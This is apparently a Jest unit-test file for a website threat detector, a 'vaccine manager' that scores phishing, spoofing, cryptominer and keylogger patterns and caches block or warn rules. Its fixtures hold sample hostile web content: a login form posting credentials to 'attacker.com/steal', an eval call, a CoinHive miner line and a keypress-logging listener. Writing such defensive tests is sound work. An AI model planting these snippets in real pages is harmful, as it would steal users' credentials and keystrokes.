/**
 * Unit Tests for Vaccine Manager
 * Test threat detection, injection, and caching
 */

import { VaccineManager } from './vaccine-manager';
import { ThreatDetector } from './threat-detector';
import { WebsiteScraper } from './website-scraper';
import { ScrapedWebsiteAnalysis, VaccineThreatType } from './types';

// Mock data
const mockAnalysis: ScrapedWebsiteAnalysis = {
  url: 'https://phishing.example.com',
  timestamp: Date.now(),
  httpStatusCode: 200,
  title: 'Amazon Login',
  domain: 'phishing.example.com',
  html: '<html><body><form action="https://attacker.com/steal"></form></body></html>',
  scripts: [
    {
      src: undefined,
      inline: true,
      content: 'eval("malicious code")',
      isObfuscated: false,
      suspicionScore: 30,
    },
  ],
  forms: [
    {
      id: 'login-form',
      action: 'https://attacker.com/steal',
      method: 'POST',
      fields: [
        { name: 'email', type: 'email', fieldSuspicionScore: 20 },
        { name: 'password', type: 'password', fieldSuspicionScore: 30 },
      ],
      targetDomain: 'attacker.com',
    },
  ],
  links: [
    {
      url: 'https://attacker.com',
      text: 'Click here',
      isExternal: true,
      targetDomain: 'attacker.com',
    },
  ],
  mediaElements: [],
  metaTags: { description: 'Sign in to your Amazon account' },
  textContent: 'Sign in with your email and password',
  isDomainMatch: true,
};

describe('VaccineManager', () => {
  let manager: VaccineManager;

  beforeEach(() => {
    manager = new VaccineManager();
  });

  describe('Threat Detection', () => {
    it('should detect phishing forms', () => {
      const detector = new ThreatDetector();
      const threats = detector.detectThreats(mockAnalysis);

      expect(threats).toContainEqual(
        expect.objectContaining({
          type: VaccineThreatType.PHISHING_FORM,
          severity: 'high',
        })
      );
    });

    it('should detect credential harvesters', () => {
      const detector = new ThreatDetector();
      const threats = detector.detectThreats(mockAnalysis);

      expect(threats).toContainEqual(
        expect.objectContaining({
          type: VaccineThreatType.CREDENTIAL_HARVESTER,
          severity: 'high',
        })
      );
    });

    it('should detect domain spoofing', () => {
      const detector = new ThreatDetector();
      const threats = detector.detectThreats(mockAnalysis);

      expect(threats).toContainEqual(
        expect.objectContaining({
          type: VaccineThreatType.SPOOFED_BRANDING,
          severity: 'critical',
        })
      );
    });

    it('should detect obfuscated code', () => {
      const obfuscatedAnalysis = {
        ...mockAnalysis,
        scripts: [
          {
            src: undefined,
            inline: true,
            content: '\\x62\\x61\\x73\\x65\\x36\\x34', // hex-encoded
            isObfuscated: true,
            suspicionScore: 75,
          },
        ],
      };

      const detector = new ThreatDetector();
      const threats = detector.detectThreats(obfuscatedAnalysis);

      expect(threats).toContainEqual(
        expect.objectContaining({
          type: VaccineThreatType.OBFUSCATED_CODE,
        })
      );
    });
  });

  describe('Threat Scoring', () => {
    it('should calculate correct threat score', () => {
      const detector = new ThreatDetector();
      const threats = detector.detectThreats(mockAnalysis);

      // mockAnalysis has: PHISHING_FORM (high=15), CREDENTIAL_HARVESTER (high=15),
      // SPOOFED_BRANDING (critical=25) = 55 points
      const score = threats.reduce((acc, threat) => {
        const weights = { critical: 25, high: 15, medium: 8, low: 3 };
        return acc + (weights[threat.severity] || 0);
      }, 0);

      expect(score).toBeGreaterThan(50);
    });

    it('should return correct threat level', () => {
      const testCases = [
        { score: 5, expected: 'safe' },
        { score: 25, expected: 'low' },
        { score: 45, expected: 'medium' },
        { score: 65, expected: 'high' },
        { score: 85, expected: 'critical' },
      ];

      testCases.forEach(({ score, expected }) => {
        const threats = mockAnalysis.threatsDetected || [];
        const level = manager['getThreatLevel'](score);
        expect(level).toBe(expected);
      });
    });
  });

  describe('Injection Rules', () => {
    it('should generate injection rules for threats', () => {
      const detector = new ThreatDetector();
      const threats = detector.detectThreats(mockAnalysis);
      const rules = threats.map((t) => t.injectionRule);

      expect(rules.length).toBeGreaterThan(0);
      expect(rules[0]).toEqual(
        expect.objectContaining({
          id: expect.any(String),
          type: expect.stringMatching(/block|warn|sandbox|disable|monitor/),
          expiresAt: expect.any(Number),
        })
      );
    });

    it('should create block rules for phishing forms', () => {
      const detector = new ThreatDetector();
      const threats = detector
        .detectThreats(mockAnalysis)
        .filter((t) => t.type === VaccineThreatType.PHISHING_FORM);

      expect(threats[0].injectionRule.type).toBe('block');
    });

    it('should create warn rules for urgency language', () => {
      const urgencyAnalysis = {
        ...mockAnalysis,
        textContent: 'ACT NOW! LIMITED TIME OFFER! Click here immediately!',
      };

      const detector = new ThreatDetector();
      const threats = detector
        .detectThreats(urgencyAnalysis)
        .filter((t) => t.type === VaccineThreatType.URGENCY_LANGUAGE);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].injectionRule.type).toBe('warn');
    });
  });

  describe('Caching', () => {
    it('should cache vaccines with 24h TTL', () => {
      const url = 'https://example.com';
      const report = {
        url,
        timestamp: Date.now(),
        threatLevel: 'low' as const,
        threatScore: 20,
        threatsDetected: [],
        injectionRules: [],
        recommendations: [],
      };

      manager['storeVaccine'](url, report, []);

      const cached = manager.getVaccine(url);
      expect(cached).not.toBeNull();
      expect(cached?.report.url).toBe(url);
    });

    it('should expire vaccines after 24 hours', () => {
      const url = 'https://example.com';
      const report = {
        url,
        timestamp: Date.now(),
        threatLevel: 'safe' as const,
        threatScore: 0,
        threatsDetected: [],
        injectionRules: [],
        recommendations: [],
      };

      manager['storeVaccine'](url, report, []);

      // Manually expire the vaccine
      const cache = manager['vaccineCache'];
      const entry = cache.get(url);
      if (entry) {
        entry.expiresAt = Date.now() - 1000; // 1 second ago
      }

      const expired = manager.getVaccine(url);
      expect(expired).toBeNull();
    });

    it('should invalidate vaccines on demand', () => {
      const url = 'https://example.com';
      const report = {
        url,
        timestamp: Date.now(),
        threatLevel: 'safe' as const,
        threatScore: 0,
        threatsDetected: [],
        injectionRules: [],
        recommendations: [],
      };

      manager['storeVaccine'](url, report, []);
      expect(manager.getVaccine(url)).not.toBeNull();

      manager.invalidateVaccine(url);
      expect(manager.getVaccine(url)).toBeNull();
    });
  });

  describe('Recommendations', () => {
    it('should generate appropriate recommendations', () => {
      const detector = new ThreatDetector();
      const threats = detector.detectThreats(mockAnalysis);
      const recommendations = manager['generateRecommendations'](
        threats,
        'high'
      );

      expect(recommendations.length).toBeGreaterThan(0);
      expect(recommendations.some((r) =>
        r.toLowerCase().includes('personal')
      )).toBe(true);
    });

    it('should prioritize critical threats', () => {
      const criticalAnalysis = {
        ...mockAnalysis,
        isDomainMatch: true,
      };

      const detector = new ThreatDetector();
      const threats = detector.detectThreats(criticalAnalysis);
      const recommendations = manager['generateRecommendations'](
        threats,
        'critical'
      );

      expect(
        recommendations.some((r) => r.toUpperCase().includes('CRITICAL'))
      ).toBe(true);
    });
  });

  describe('Statistics', () => {
    it('should track vaccine statistics', () => {
      const url = 'https://example.com';
      const report = {
        url,
        timestamp: Date.now(),
        threatLevel: 'high' as const,
        threatScore: 70,
        threatsDetected: [
          {
            type: VaccineThreatType.PHISHING_FORM,
            severity: 'high' as const,
            description: 'Test',
            evidence: 'Test',
            injectionRule: {
              id: 'test',
              type: 'block' as const,
              expiresAt: 0,
            },
          },
        ],
        injectionRules: [],
        recommendations: [],
      };

      manager['storeVaccine'](url, report, []);

      const stats = manager.getStats();
      expect(stats.cachedVaccines).toBeGreaterThan(0);
      expect(stats.totalThreats).toBeGreaterThan(0);
      expect(stats.threatsByType).toHaveProperty(
        VaccineThreatType.PHISHING_FORM
      );
    });
  });
});

describe('ThreatDetector Malware Signatures', () => {
  let detector: ThreatDetector;

  beforeEach(() => {
    detector = new ThreatDetector();
  });

  it('should detect cryptominer patterns', () => {
    const analysisCryptominer = {
      ...mockAnalysis,
      scripts: [
        {
          src: 'https://coinhive.min.js',
          inline: false,
          content: 'var miner = new CoinHive.Anonymous()',
          isObfuscated: false,
          suspicionScore: 80,
        },
      ],
    };

    const threats = detector.detectThreats(analysisCryptominer);
    expect(threats.some((t) => t.type === VaccineThreatType.MALWARE_SIGNATURE))
      .toBe(true);
  });

  it('should detect keylogger patterns', () => {
    const analysisKeylogger = {
      ...mockAnalysis,
      scripts: [
        {
          src: undefined,
          inline: true,
          content:
            'document.addEventListener("keypress", (e) => { sendLog(e.keyCode); })',
          isObfuscated: false,
          suspicionScore: 85,
        },
      ],
    };

    const threats = detector.detectThreats(analysisKeylogger);
    expect(threats.some((t) => t.type === VaccineThreatType.MALWARE_SIGNATURE))
      .toBe(true);
  });
});

// Async tests (skip if no test runner configured)
describe('Integration Tests (Async)', () => {
  let manager: VaccineManager;

  beforeEach(() => {
    manager = new VaccineManager();
  });

  it.skip('should vaccinate a real website', async () => {
    // Note: This test hits the real network
    // Only run with: npm test -- --testNamePattern="vaccinate a real website"
    const report = await manager.vaccinate('https://example.com');

    expect(report).toEqual(
      expect.objectContaining({
        url: expect.any(String),
        threatLevel: expect.stringMatching(
          /safe|low|medium|high|critical/
        ),
        threatScore: expect.any(Number),
        threatsDetected: expect.any(Array),
        injectionRules: expect.any(Array),
      })
    );
  });

  it.skip('should get or vaccinate', async () => {
    const url = 'https://example.com';

    // First call: vaccinates
    const report1 = await manager.getOrVaccinate(url);
    expect(report1).toBeDefined();

    // Second call: returns cached
    const report2 = await manager.getOrVaccinate(url);
    expect(report2).toEqual(report1);
  });
});
